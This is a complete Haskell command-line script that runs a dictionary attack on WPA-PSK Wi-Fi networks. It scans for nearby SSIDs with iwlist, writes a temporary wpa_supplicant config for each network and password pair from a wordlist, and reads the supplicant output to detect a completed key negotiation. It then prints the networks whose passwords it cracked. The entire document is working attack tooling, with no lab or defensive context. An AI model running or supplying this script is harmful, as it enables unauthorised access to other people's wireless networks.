#!/usr/bin/env runhaskell

module Main where

import Control.Arrow
import Data.List
import Data.Maybe
import GHC.IO.Handle
import System.Environment
import System.Process
import System.Timeout

data Status = Good String | Wrong String | Error String | Proceed String deriving (Eq, Show)

maxSeconds :: Int
maxSeconds = 5

maxLines :: Int
maxLines = 10

main :: IO ()
main = do
    ( interface : passwordFile : freeArgs ) <- getArgs
    putStrLn $ "=== launch on interface [ " ++ interface ++ " ] ==="

    putStrLn "--- listing networks ---"
    readProcess "ip" ["link", "set", interface, "up"] ""
    networks <- case freeArgs of
            [] -> iwlist interface
            _  -> fmap (intersect freeArgs) $ iwlist interface 
    if length networks == 0
        then errorWithoutStackTrace "No networks found."
        else return ()
    passwords <- fmap lines $ readFile passwordFile
    printPreamble networks passwords

    putStrLn "--- scan initiated ---"

    results <- sequence [ attempt interface network password
                        | password <- passwords
                        , network <- networks
                        ]

    putStrLn "--- scan completed ---"

    printResults results

    where

    printPreamble networks passwords = putStrLn . concat $
        [ "[ networks :: ", show . length $ networks, " ] "
        , "[ passwords :: ", show . length $ passwords, " ] "
        , "[ total :: " , show $ length networks * length passwords, " ]"
        , "\n"
        , "Expected timing: "
        , show $ length networks * length passwords * maxSeconds `div` 60
        , " minutes."
        ]

    printResults results
        | length goodResults > 0 = do
            putStrLn showResultHeader
            putStr $ unlines $ showResult `fmap` goodResults
        | otherwise = putStrLn "=== no networks found ==="

        where

        isGood (Good _) = True
        isGood _ = False

        goodResults = filter (snd >>> isGood) results

        showResultHeader = concat [ "=== found ", show . length $ goodResults, " networks ===" ]

        showResult ((network, password), Good message) = concat
            [ "[ ", network, " ] [ ", password, " ]" ]

attempt :: String -> String -> String -> IO ((String, String), Status)
attempt interface network password
    =   reportPrefix
    >>  conf interface network password
    >>= supplicant interface
    >>= reportStatus

    where
    reportPrefix = putStr . concat $ [ "[ ", network, " ] [ ", password, " ] -- " ]
    reportStatus status = (putStrLn . show) status >> return ((network, password), status)

iwlist :: String -> IO [String]
iwlist interface = fmap parse output
    where
    output :: IO String
    output = readProcess "iwlist" [interface, "scanning"] ""

    parse :: String -> [String]
    parse = lines
        >>> fmap (dropWhile (== ' '))
        >>> filter (isPrefixOf "ESSID:")
        >>> fmap (drop 6)
        >>> fmap (tail >>> init)

conf :: String -> String -> String -> IO String
conf interface network password = do
    writeFile conf text
    return conf
    where
    conf = "/tmp/wifi-bruteforce." ++ interface ++ ".tmp"
    text = concat
        [ "ctrl_interface=/run/wpa_supplicant_" ++ interface ++ "\n"
        , "ctrl_interface_group=wheel\nnetwork={\n    key_mgmt=WPA-PSK\n    psk=\""
        , password
        , "\"\n    ssid=\""
        , network
        , "\"\n}"
        ]

supplicant :: String -> String -> IO Status
supplicant interface conf = do
    (in_, out, err, pid) <- createProcess $ processDescription { std_out = CreatePipe }
    res <- case out of
        (Just handle) -> getToken handle
        _ -> error "Unable to get hold of wpa_supplicant stdout."
    case res of
        (Good _) -> terminateProcess pid >> waitForProcess pid
        (_) -> waitForProcess pid
    return res

    where

    processDescription = proc "timeout"
        [ show (maxSeconds + 1)
        , "wpa_supplicant"
        , "-P", concat [ "/run/wpa_supplicant_", interface, ".pid" ]
        , "-i", interface
        , "-D", "nl80211,wext"
        , "-C", "/run/wpa_supplicant_" ++ interface
        , "-c", conf
        ]

    getToken = fmap maybeError <<< timeout (maxSeconds * 10 ^ 6) <<< getToken' maxLines
        where
        maybeError = maybe (Error $ "No definite result after " ++ show maxSeconds ++ " seconds.") id

    getToken' i handle
        | i > 0 = do
            token <- tokenize `fmap` hGetLine handle
            case token of 
                (Proceed _) -> putStrLn (show token) >> getToken' (i - 1) handle
                _ -> return token
        | otherwise = return (Error $ "No definite result after " ++ show maxLines ++ " lines.")

    tokenize :: String -> Status
    tokenize message
        | "Key negotiation completed" `isInfixOf` message = Good message
        | "4-Way Handshake failed" `isInfixOf` message = Wrong message
        | "timed out" `isInfixOf` message = Error message
        | "ioctl" `isInfixOf` message = Error message
        | "Association request to the driver failed" `isInfixOf` message = Error message
        | "CTRL-EVENT-TERMINATING" `isInfixOf` message = Error message
        | otherwise = Proceed message

